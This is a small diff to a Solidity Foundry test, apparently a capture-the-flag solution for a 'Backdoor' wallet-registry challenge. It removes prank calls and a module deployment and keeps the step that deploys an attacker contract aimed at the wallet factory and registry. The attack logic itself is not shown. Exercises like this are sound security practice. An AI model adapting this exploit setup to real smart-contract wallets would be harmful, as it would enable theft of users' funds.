@@ -82,10 +82,6 @@ contract Backdoor is Test {
          * EXPLOIT START *
          */
 
-        vm.startPrank(attacker);
-
-        // deploy the attack backdoor gnosis module
-        new AttackBackdoorModule();
         // deploy the attack backdoor contract (all logic in constructor)
         new AttackBackdoor( address(attacker), 
                             address(walletFactory), 
@@ -93,8 +89,6 @@ contract Backdoor is Test {
                             address(walletRegistry),
                             address(dvt),
                             users );
-
-        vm.stopPrank();
 
         /**
          * EXPLOIT END *
